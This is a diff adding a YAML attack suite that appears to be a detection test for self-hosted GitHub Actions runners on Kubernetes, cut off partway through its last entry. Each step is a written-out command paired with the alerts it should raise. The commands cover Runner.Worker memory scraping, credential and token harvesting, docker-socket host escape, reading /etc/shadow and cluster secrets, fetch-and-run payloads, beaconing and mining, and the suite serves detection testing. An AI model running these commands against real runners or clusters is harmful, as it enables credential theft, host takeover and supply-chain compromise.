@@ -1,0 +1,908 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: github-runner-killchain-attacks
+  description: >-
+    Kill-chain ordered attack suite for self-hosted GitHub Actions runners on
+    Kubernetes (Actions Runner Controller), modelled on the CNCF automation
+    rig: AutoscalingRunnerSet in containerMode dind, privileged dockerd
+    sidecar, /var/run/docker.sock shared into an unprivileged (uid 1000)
+    runner, hostPath /sys/fs/cgroup and /lib/modules, a single 50Gi emptyDir
+    backing /_work /.cache /.gradle /go /.m2 /tmp, enterprise-scope
+    registration and max 200 replicas.
+
+    Replays the Oct 2025 - Oct 2026 runner vulnerability record:
+    CVE-2026-45321 (TanStack, CVSS 9.6 - pull_request_target pwn request +
+    cache poisoning across the fork/base boundary + OIDC token extraction
+    from runner process memory), CVE-2025-30066 (tj-actions/changed-files -
+    Runner.Worker memory dumped via /proc/<pid>/mem, 23k+ repos),
+    CVE-2026-34041 and CVE-2026-34042 (act <0.2.86 - ::set-env::/::add-path::
+    reprocessing, and an unauthenticated cache server on 0.0.0.0),
+    CVE-2025-32955 (Harden-Runner disable-sudo bypass via the container
+    runtime socket), GHSA-69fq-xp46-6x23 (Trivy action tag force-push),
+    GHSA-2c6m-6gqh-6qg3 (actions/runner docker command escaping), the
+    Shai-Hulud and Shai-Hulud Part 2 worms (rogue runner registration as C2,
+    forged Sigstore certificate), and the ARC dind node-escape chain
+    (docker.sock -> privileged container -> /dev -> host mount ->
+    /etc/kubernetes/admin.conf).
+
+    Covers MITRE ATT&CK TA0043, TA0001, TA0002, TA0003, TA0004, TA0005,
+    TA0006, TA0007, TA0008, TA0010, TA0011, TA0040 and CICD-SEC-1/3/4/5/6/7.
+
+    Detection intent: every entry declares what a correctly-bound
+    ContainerProfile should alert on. Entries with expectedDetections: [] are
+    benign-shaped baseline steps a runner legitimately performs - they exist
+    so a contrast run can show which of these are indistinguishable from CI
+    work, which is the whole point of contrast testing a runner.
+
+target:
+  service: cncf-c-ubuntu-2-8-x86
+  namespace: arc-runners
+  port: 8080
+  protocol: http
+
+attacks:
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 1: RECONNAISSANCE (TA0043) — what the runner can see about itself
+  # Baseline-shaped: a real build does most of this. Expected to be quiet.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1082 — System Information Discovery
+  - name: recon-runner-identity
+    type: custom
+    exec:
+      command: ["sh", "-c", "id; hostname; cat /etc/os-release | head -3"]
+    expectedDetections: []
+
+  # T1082 — runner work layout: all of these share one 50Gi emptyDir
+  - name: recon-shared-work-volume
+    type: custom
+    exec:
+      command: ["sh", "-c", "df -h /_work /.cache /.gradle /go /.m2 /tmp 2>/dev/null; mount | grep -E '_work|cache'"]
+    expectedDetections: []
+
+  # T1613 — Container and Resource Discovery: is the docker socket reachable?
+  - name: recon-docker-socket-present
+    type: custom
+    exec:
+      command: ["sh", "-c", "ls -l /var/run/docker.sock; id -G"]
+    expectedDetections: []
+
+  # T1613 — the socket is group-readable via supplementalGroups [999]
+  - name: recon-docker-daemon-reachable
+    type: custom
+    exec:
+      command: ["sh", "-c", "docker version --format '{{.Server.Version}}' 2>&1 | head -2"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: docker
+
+  # T1082 — hostPath mounts the manifest grants
+  - name: recon-hostpath-mounts
+    type: custom
+    exec:
+      command: ["sh", "-c", "ls /lib/modules; ls /sys/fs/cgroup | head -5"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
+  # T1046 — Network Service Discovery: the ARC listener and kube API
+  - name: recon-cluster-endpoints
+    type: custom
+    exec:
+      command: ["sh", "-c", "getent hosts kubernetes.default.svc.cluster.local; env | grep -i KUBERNETES_"]
+    expectedDetections: []
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 2: CREDENTIAL ACCESS IN-POD (TA0006)
+  # CVE-2026-45321 and CVE-2025-30066 both live here. This is the phase that
+  # turns a PR into a published package.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.001 — Credentials In Files: the ARC runner's registration material
+  - name: cred-runner-credentials-file
+    type: lfi
+    exec:
+      command: ["sh", "-c", "cat /home/runner/.credentials /home/runner/.runner 2>/dev/null; cat /_work/.credentials* 2>/dev/null"]
+    expectedDetections:
+      - attackType: lfi
+        ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: runner
+      - attackType: lfi
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
+  # T1528 — Steal Application Access Token: the pod's SA token.
+  # The manifest's SA is "...-gha-rs-no-permission", so this grants little —
+  # but the token file is still mounted and reading it must still alert.
+  - name: cred-service-account-token
+    type: lfi
+    exec:
+      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
+    expectedDetections:
+      - attackType: lfi
+        ruleID: R0006
+        ruleName: Unexpected service account token access
+        containerName: runner
+      - attackType: lfi
+        ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: runner
+
+  # T1552.007 — the whole SA directory, as the TanStack payload did
+  - name: cred-service-account-directory-sweep
+    type: lfi
+    exec:
+      command: ["sh", "-c", "for f in /var/run/secrets/kubernetes.io/serviceaccount/*; do echo \"== $f\"; cat \"$f\"; done"]
+    expectedDetections:
+      - attackType: lfi
+        ruleID: R0006
+        ruleName: Unexpected service account token access
+        containerName: runner
+
+  # CVE-2025-30066 / CVE-2026-45321 — THE technique of the period.
+  # Locate the runner worker whose memory holds the secrets and OIDC token.
+  - name: cred-locate-runner-worker-process
+    type: custom
+    exec:
+      command: ["sh", "-c", "ps -ef | grep -E 'Runner.Worker|Runner.Listener' | grep -v grep"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: ps
+
+  # CVE-2025-30066 — dump Runner.Worker memory via /proc/<pid>/mem.
+  # The original payload scanned for secret patterns in the heap.
+  - name: cred-runner-worker-memory-dump
+    type: fileless
+    exec:
+      command: ["sh", "-c", "PID=$(pgrep -f Runner.Worker | head -1); test -n \"$PID\" && cat /proc/$PID/maps >/dev/null && dd if=/proc/$PID/mem bs=1 count=4096 2>/dev/null | strings | head -20"]
+    expectedDetections:
+      - attackType: fileless
+        ruleID: R0008
+        ruleName: Read Environment Variables from procfs
+        containerName: runner
+      - attackType: fileless
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+      - attackType: fileless
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: dd
+
+  # CVE-2026-45321 — the OIDC-token-shaped scan: {"value":"...","isSecret":true}
+  - name: cred-oidc-token-memory-scrape
+    type: fileless
+    exec:
+      command: ["sh", "-c", "PID=$(pgrep -f Runner.Worker | head -1); grep -a -o '{\"value\":\"[^\"]*\",\"isSecret\":true}' /proc/$PID/mem 2>/dev/null | head -3"]
+    expectedDetections:
+      - attackType: fileless
+        ruleID: R0008
+        ruleName: Read Environment Variables from procfs
+        containerName: runner
+      - attackType: fileless
+        ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: runner
+
+  # T1055.008 — Ptrace: the louder variant of the same objective
+  - name: cred-ptrace-attach-runner-worker
+    type: fileless
+    exec:
+      command: ["sh", "-c", "PID=$(pgrep -f Runner.Worker | head -1); timeout 5 gdb -p $PID -batch -ex 'info proc mappings' 2>&1 | head -5 || timeout 5 strace -p $PID 2>&1 | head -5"]
+    expectedDetections:
+      - attackType: fileless
+        ruleID: R1015
+        ruleName: Malicious Ptrace Usage
+        containerName: runner
+      - attackType: fileless
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+
+  # T1552.001 — environment-borne secrets, the cheap path first
+  - name: cred-environment-secrets
+    type: custom
+    exec:
+      command: ["sh", "-c", "env | grep -iE 'TOKEN|SECRET|KEY|PASSWORD|ACTIONS_|GITHUB_' | head -20"]
+    expectedDetections: []
+
+  # T1552.001 — other processes' environments via procfs
+  - name: cred-procfs-environ-sweep
+    type: fileless
+    exec:
+      command: ["sh", "-c", "for p in /proc/[0-9]*; do tr '\\0' '\\n' < $p/environ 2>/dev/null | grep -iE 'TOKEN|SECRET'; done | head -10"]
+    expectedDetections:
+      - attackType: fileless
+        ruleID: R0008
+        ruleName: Read Environment Variables from procfs
+        containerName: runner
+
+  # CVE-2026-45321 — the payload's credential harvest list, cloud metadata leg
+  - name: cred-cloud-imds-harvest
+    type: ssrf
+    exec:
+      command: ["sh", "-c", "curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token; curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: runner
+        endpoint: 169.254.169.254
+      - attackType: ssrf
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: curl
+
+  # CVE-2026-45321 — package-registry and SSH credentials in the home tree
+  - name: cred-npmrc-and-ssh-keys
+    type: lfi
+    exec:
+      command: ["sh", "-c", "cat ~/.npmrc ~/.docker/config.json 2>/dev/null; ls -la ~/.ssh/ 2>/dev/null; cat ~/.ssh/id_* 2>/dev/null | head -5"]
+    expectedDetections:
+      - attackType: lfi
+        ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: runner
+      - attackType: lfi
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
+  # CVE-2026-45321 — Vault token, the fourth item on the payload's list
+  - name: cred-vault-token
+    type: lfi
+    exec:
+      command: ["sh", "-c", "cat ~/.vault-token 2>/dev/null; env | grep -i VAULT_"]
+    expectedDetections:
+      - attackType: lfi
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 3: WORKFLOW COMMAND INJECTION (TA0002) — CVE-2026-34041
+  # act <0.2.86 reprocesses ::set-env:: and ::add-path::, disabled upstream
+  # precisely because they rewrite the environment of every later step.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1059 — ::set-env:: injection via untrusted stdout
+  - name: inject-set-env-workflow-command
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "echo '::set-env name=LD_PRELOAD::/tmp/evil.so'; echo '::set-env name=NODE_OPTIONS::--require /tmp/evil.js'"]
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0040
+        ruleName: Unexpected process arguments
+        containerName: runner
+
+  # T1574.007 — ::add-path:: PATH hijack for all subsequent steps
+  - name: inject-add-path-hijack
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "mkdir -p /tmp/hijack && printf '#!/bin/sh\\nexec /usr/bin/git \"$@\"\\n' > /tmp/hijack/git && chmod +x /tmp/hijack/git && echo '::add-path::/tmp/hijack'"]
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+      - attackType: cmdinject
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: chmod
+
+  # GHSA-2c6m-6gqh-6qg3 — docker command escaping out of an env var
+  - name: inject-docker-command-escape
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "export EVIL='x\" --privileged -v /:/host --entrypoint sh alpine -c \"id'; docker run --rm alpine sh -c \"echo $EVIL\" 2>&1 | head -3"]
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0040
+        ruleName: Unexpected process arguments
+        containerName: runner
+      - attackType: cmdinject
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: docker
+
+  # T1036 — the GITHUB_ENV file-based successor, same objective
+  - name: inject-github-env-file-write
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "echo 'LD_PRELOAD=/tmp/evil.so' >> ${GITHUB_ENV:-/_work/_temp/_runner_file_commands/set_env_probe}"]
+    expectedDetections:
+      - attackType: cmdinject
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 4: CACHE POISONING (TA0003 / CICD-SEC-6) — CVE-2026-34042,
+  # and stage 2 of CVE-2026-45321. Cache scope is per-branch and
+  # pull_request_target writes into the default branch's scope; the default
+  # TTL is a sliding 7 days, so a poisoned entry outlives the PR by a week.
+  # On this rig every cache path shares ONE 50Gi emptyDir.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # CVE-2026-34042 — the act cache server bound to 0.0.0.0 with no auth
+  - name: cache-unauthenticated-server-probe
+    type: ssrf
+    exec:
+      command: ["sh", "-c", "for p in 8080 34567 42000; do curl -s -m 2 -o /dev/null -w \"$p:%{http_code}\\n\" http://127.0.0.1:$p/_apis/artifactcache/cache 2>/dev/null; done"]
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: curl
+
+  # CVE-2026-45321 stage 2 — write into the cache the privileged consumer reads
+  - name: cache-poison-shared-work-volume
+    type: custom
+    exec:
+      command: ["sh", "-c", "mkdir -p /.cache/poison /go/pkg/mod/cache/download /.m2/repository /.gradle/caches && printf 'console.log(require(\"child_process\").execSync(\"id\"))' > /.cache/poison/postinstall.js && cp /.cache/poison/postinstall.js /.m2/repository/.poison"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
+  # T1195.001 — poison the toolchain the next job resolves from cache
+  - name: cache-poison-node-modules-shim
+    type: custom
+    exec:
+      command: ["sh", "-c", "mkdir -p /_work/_tool/node/bin && printf '#!/bin/sh\\ncurl -s -m 2 http://127.0.0.1:1/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 16) >/dev/null 2>&1\\nexec /usr/bin/node \"$@\"\\n' > /_work/_tool/node/bin/node && chmod +x /_work/_tool/node/bin/node"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+      - attackType: custom
+        ruleID: R0006
+        ruleName: Unexpected service account token access
+        containerName: runner
+
+  # T1554 — persistence inside the shared volume across runner generations
+  - name: cache-persist-across-jobs
+    type: custom
+    exec:
+      command: ["sh", "-c", "printf '* * * * * /tmp/.beacon\\n' > /tmp/.cron-stage && printf '#!/bin/sh\\n:\\n' > /tmp/.beacon && chmod +x /tmp/.beacon && ls -la /tmp/.beacon"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+      - attackType: custom
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: chmod
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 5: DOCKER SOCKET ABUSE → HOST ESCAPE (TA0004)
+  # CVE-2025-32955 (disable-sudo bypass via the runtime socket) and the ARC
+  # dind node-escape chain. The runner is uid 1000 and unprivileged, but the
+  # socket it holds speaks to a root dockerd running privileged: true.
+  # This is the phase the CNCF manifest makes structurally available.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # CVE-2025-32955 — privileged container via the socket, defeating disable-sudo
+  - name: escape-privileged-container-via-socket
+    type: custom
+    exec:
+      command: ["sh", "-c", "docker run --rm --privileged alpine sh -c 'id; capsh --print 2>/dev/null | head -3' 2>&1 | head -6"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1006
+        ruleName: Process tries to escape container
+        containerName: runner
+      - attackType: custom
+        ruleID: R0004
+        ruleName: Linux Capabilities Anomalies in container
+        containerName: runner
+      - attackType: custom
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: docker
+
+  # ARC escape step 1 — enumerate the node's block devices through /dev
+  - name: escape-enumerate-host-block-devices
+    type: custom
+    exec:
+      command: ["sh", "-c", "docker run --rm --privileged -v /dev:/dev alpine sh -c \"fdisk -l 2>/dev/null | grep '^Disk /dev'\" 2>&1 | head -5"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1006
+        ruleName: Process tries to escape container
+        containerName: runner
+      - attackType: custom
+        ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: runner
+
+  # ARC escape step 2 — mount the node root filesystem
+  - name: escape-mount-host-root-filesystem
+    type: custom
+    exec:
+      command: ["sh", "-c", "docker run --rm --privileged -v /dev:/dev alpine sh -c 'mkdir -p /mnt/host && mount /dev/dm-0 /mnt/host 2>/dev/null || mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host' 2>&1 | head -8"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1006
+        ruleName: Process tries to escape container
+        containerName: runner
+      - attackType: custom
+        ruleID: R1004
+        ruleName: Process executed from mount
+        containerName: runner
+
+  # ARC escape step 3 — the payoff: cluster-admin kubeconfig off the node
+  - name: escape-read-node-kubeconfig
+    type: lfi
+    exec:
+      command: ["sh", "-c", "docker run --rm --privileged -v /dev:/dev alpine sh -c 'mkdir -p /mnt/host && mount /dev/dm-0 /mnt/host 2>/dev/null; cat /mnt/host/etc/kubernetes/admin.conf 2>/dev/null || cat /mnt/host/etc/rancher/k3s/k3s.yaml 2>/dev/null' | head -5"]
+    expectedDetections:
+      - attackType: lfi
+        ruleID: R1006
+        ruleName: Process tries to escape container
+        containerName: runner
+      - attackType: lfi
+        ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: runner
+
+  # T1610 — the shorter road: bind-mount / and chroot
+  - name: escape-host-root-bind-mount
+    type: custom
+    exec:
+      command: ["sh", "-c", "docker run --rm -v /:/host alpine sh -c 'chroot /host id; cat /host/etc/shadow | head -2' 2>&1 | head -5"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1006
+        ruleName: Process tries to escape container
+        containerName: runner
+      - attackType: custom
+        ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: runner
+
+  # T1610 — hostPID/hostNetwork container, nsenter into PID 1
+  - name: escape-nsenter-host-namespaces
+    type: custom
+    exec:
+      command: ["sh", "-c", "docker run --rm --privileged --pid=host alpine nsenter --target 1 --mount --uts --ipc --net -- id 2>&1 | head -3"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1006
+        ruleName: Process tries to escape container
+        containerName: runner
+      - attackType: custom
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: nsenter
+
+  # T1552.001 — other containers' secrets from the node's kubelet tree
+  - name: escape-harvest-node-pod-secrets
+    type: lfi
+    exec:
+      command: ["sh", "-c", "docker run --rm -v /var/lib/kubelet:/k alpine sh -c 'find /k/pods -name token -path \"*serviceaccount*\" 2>/dev/null | head -5' 2>&1 | head -6"]
+    expectedDetections:
+      - attackType: lfi
+        ruleID: R0006
+        ruleName: Unexpected service account token access
+        containerName: runner
+      - attackType: lfi
+        ruleID: R1006
+        ruleName: Process tries to escape container
+        containerName: runner
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 6: CGROUP AND KERNEL SURFACE (TA0004)
+  # The manifest mounts /sys/fs/cgroup and /lib/modules into the runner
+  # directly — no docker socket needed for this phase.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1611 — cgroup-v1 release_agent escape
+  - name: escape-cgroup-release-agent
+    type: custom
+    exec:
+      command: ["sh", "-c", "test -w /sys/fs/cgroup && mkdir -p /sys/fs/cgroup/rdma/esc 2>/dev/null && echo 1 > /sys/fs/cgroup/rdma/esc/notify_on_release 2>/dev/null; ls -l /sys/fs/cgroup/*/release_agent 2>/dev/null | head -3"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1006
+        ruleName: Process tries to escape container
+        containerName: runner
+      - attackType: custom
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
+  # T1547.006 — kernel module load, reachable because /lib/modules is mounted
+  - name: escape-kernel-module-load
+    type: custom
+    exec:
+      command: ["sh", "-c", "ls /lib/modules/$(uname -r)/kernel/net 2>/dev/null | head -3; modprobe dummy 2>&1 | head -2; insmod /lib/modules/$(uname -r)/kernel/drivers/dummy.ko 2>&1 | head -2"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1002
+        ruleName: Process tries to load a kernel module
+        containerName: runner
+      - attackType: custom
+        ruleID: R0004
+        ruleName: Linux Capabilities Anomalies in container
+        containerName: runner
+
+  # T1620 — eBPF load from the runner, the quietest kernel-level foothold
+  - name: escape-ebpf-program-load
+    type: fileless
+    exec:
+      command: ["sh", "-c", "docker run --rm --privileged alpine sh -c 'ls /sys/fs/bpf 2>/dev/null; cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null' 2>&1 | head -3"]
+    expectedDetections:
+      - attackType: fileless
+        ruleID: R0009
+        ruleName: eBPF Program Load
+        containerName: runner
+      - attackType: fileless
+        ruleID: R1006
+        ruleName: Process tries to escape container
+        containerName: runner
+
+  # T1222 — symlink a sensitive host path into the shared work volume
+  - name: escape-symlink-sensitive-path
+    type: custom
+    exec:
+      command: ["sh", "-c", "ln -sf /etc/shadow /_work/.shadow-link 2>/dev/null; ln -sf /var/run/docker.sock /_work/.sock-link 2>/dev/null; ls -l /_work/.shadow-link /_work/.sock-link 2>/dev/null"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1010
+        ruleName: Soft link created over sensitive file
+        containerName: runner
+      - attackType: custom
+        ruleID: R0002
+        ruleName: Files Access Anomalies in container
+        containerName: runner
+
+  # T1222 — hardlink variant, which bypasses symlink-aware checks
+  - name: escape-hardlink-sensitive-path
+    type: custom
+    exec:
+      command: ["sh", "-c", "ln /etc/passwd /_work/.passwd-hard 2>/dev/null; ls -l /_work/.passwd-hard 2>/dev/null"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1012
+        ruleName: Hard link created over sensitive file
+        containerName: runner
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 7: CLUSTER LATERAL MOVEMENT (TA0008)
+  # With the node kubeconfig from Phase 5, arc-systems holds the prizes:
+  # oci-api-key (OCI PEM), github-arc-secret (the PAT ARC registers with),
+  # and oci-config. The runner's own SA is deliberately powerless; this
+  # phase does not use it.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1613 — API discovery with the stolen admin credential
+  - name: lateral-cluster-api-discovery
+    type: custom
+    exec:
+      command: ["sh", "-c", "kubectl --insecure-skip-tls-verify get ns 2>&1 | head -5; kubectl auth can-i --list 2>&1 | head -5"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0007
+        ruleName: Workload uses Kubernetes API unexpectedly
+        containerName: runner
+      - attackType: custom
+        ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: runner
+        command: kubectl
+
+  # T1552.007 — the ARC secrets: PAT and OCI private key
+  - name: lateral-read-arc-systems-secrets
+    type: custom
+    exec:
+      command: ["sh", "-c", "kubectl -n arc-systems get secret github-arc-secret oci-api-key oci-config -o json 2>&1 | head -10"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0007
+        ruleName: Workload uses Kubernetes API unexpectedly
+        containerName: runner
+      - attackType: custom
+        ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: runner
+
+  # T1552.007 — every secret in the cluster, the TanStack payload's K8s leg
+  - name: lateral-sweep-all-namespace-secrets
+    type: custom
+    exec:
+      command: ["sh", "-c", "kubectl get secrets -A -o json 2>&1 | head -10"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0007
+        ruleName: Workload uses Kubernetes API unexpectedly
+        containerName: runner
+
+  # T1609 — exec into a neighbouring pod on the shared cluster
+  - name: lateral-exec-into-neighbour-pod
+    type: custom
+    exec:
+      command: ["sh", "-c", "POD=$(kubectl -n arc-systems get pod -l app.kubernetes.io/component=controller-manager -o name 2>/dev/null | head -1); kubectl -n arc-systems exec $POD -- id 2>&1 | head -3"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R2000
+        ruleName: Exec to pod
+        containerName: runner
+      - attackType: custom
+        ruleID: R0007
+        ruleName: Workload uses Kubernetes API unexpectedly
+        containerName: runner
+
+  # T1610 — kubelet read-only and TLS exec surface from inside the cluster
+  - name: lateral-kubelet-exec-request
+    type: ssrf
+    exec:
+      command: ["sh", "-c", "NODE_IP=$(getent hosts kubernetes.default | awk '{print $1}'); curl -sk -m 3 https://${NODE_IP}:10250/runningpods/ 2>&1 | head -3; curl -sk -m 3 https://${NODE_IP}:10250/exec/default/x/y 2>&1 | head -2"]
+    expectedDetections:
+      - attackType: ssrf
+        ruleID: R1031
+        ruleName: Kubelet TLS Exec Request Detected
+        containerName: runner
+      - attackType: ssrf
+        ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: runner
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 8: PERSISTENCE AND C2 (TA0003 / TA0011)
+  # Shai-Hulud (2025-11-24) installed rogue self-hosted runners as C2;
+  # Part 2 forged its own Sigstore certificate. Enterprise-scope
+  # registration and max 200 replicas make this the widest blast radius
+  # on this rig.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1543 — register a rogue runner with the stolen ARC PAT
+  - name: persist-register-rogue-runner
+    type: custom
+    exec:
+      command: ["sh", "-c", "curl -s -m 3 -X POST -H 'Authorization: Bearer REDACTED' https://api.github.com/enterprises/cncf/actions/runners/registration-token 2>&1 | head -3"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: runner
+        endpoint: api.github.com
+      - attackType: custom
+        ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: runner
+        endpoint: api.github.com
+
+  # T1105 — stage a runner binary outside the image, executed from the volume
+  - name: persist-stage-runner-binary
+    type: custom
+    exec:
+      command: ["sh", "-c", "mkdir -p /_work/.rogue && printf '#!/bin/sh\\nwhile :; do sleep 3600; done\\n' > /_work/.rogue/run.sh && chmod +x /_work/.rogue/run.sh && /_work/.rogue/run.sh & sleep 1; echo staged"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1004
+        ruleName: Process executed from mount
+        containerName: runner
+      - attackType: custom
+        ruleID: R1001
+        ruleName: Drifted process executed
+        containerName: runner
+
+  # T1105 — fetch and execute, never touching disk
+  - name: persist-fileless-payload-execution
+    type: fileless
+    exec:
+      command: ["sh", "-c", "curl -s -m 3 http://127.0.0.1:1/payload.sh 2>/dev/null | sh 2>&1 | head -2; echo '#!/bin/sh\\nid' | sh"]
+    expectedDetections:
+      - attackType: fileless
+        ruleID: R1005
+        ruleName: Fileless execution detected
+        containerName: runner
+      - attackType: fileless
+        ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: runner
+
+  # T1071.001 — beacon out over the runner's normal HTTPS egress path
+  - name: c2-beacon-over-https
+    type: custom
+    exec:
+      command: ["sh", "-c", "curl -s -m 3 -o /dev/null -w '%{http_code}' https://api.github.com/zen 2>&1; curl -s -m 3 -o /dev/null https://pipedream.net/ 2>&1"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: runner
+      - attackType: custom
+        ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: runner
+
+  # T1496 — the runner's 4 CPU / 12Gi limit is a mining target in itself
+  - name: impact-cryptominer-launch
+    type: custom
+    exec:
+      command: ["sh", "-c", "printf '#!/bin/sh\\nexec :\\n' > /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig --donate-level 1 -o pool.minexmr.com:4444 2>&1 | head -2"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1007
+        ruleName: Crypto miner launched
+        containerName: runner
+      - attackType: custom
+        ruleID: R1009
+        ruleName: Crypto Mining Related Port Communication
+        containerName: runner
+      - attackType: custom
+        ruleID: R1004
+        ruleName: Process executed from mount
+        containerName: runner
+
+  # T1496 — mining-pool DNS, the cheapest signal in the whole suite
+  - name: impact-mining-pool-dns
+    type: custom
+    exec:
+      command: ["sh", "-c", "getent hosts pool.minexmr.com xmr.pool.minergate.com 2>&1 | head -3"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R1008
+        ruleName: Crypto Mining Domain Communication
+        containerName: runner
+        endpoint: pool.minexmr.com
+      - attackType: custom
+        ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: runner
+        endpoint: pool.minexmr.com
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 9: SUPPLY-CHAIN PUBLISH (TA0010 / CICD-SEC-4)
+  # Where the period's incidents actually ended: TanStack published 84
+  # versions across 42 packages; Trivy had 76 of 77 action tags force-pushed;
+  # tj-actions had every tag repointed at one malicious commit.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # CVE-2026-45321 — exchange the scraped OIDC token at npm's federation endpoint
+  - name: publish-oidc-token-exchange
+    type: custom
+    exec:
+      command: ["sh", "-c", "curl -s -m 3 -X POST -H 'Authorization: Bearer REDACTED' https://registry.npmjs.org/-/npm/v1/oidc/token/exchange 2>&1 | head -3"]
+    expectedDetections:
+      - attackType: custom
+        ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: runner
+        endpoint: registry.npmjs.org
+      - attackType: custom
+        ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: runner
+        endpoint: registry.npmjs.org
+
+  # Shai-Hulud Part 2 — obtain a Fulcio signing certificate with the stolen OIDC
+  - name: publish-sigstore-fulcio-certificate
+    type: custom
+    exec:
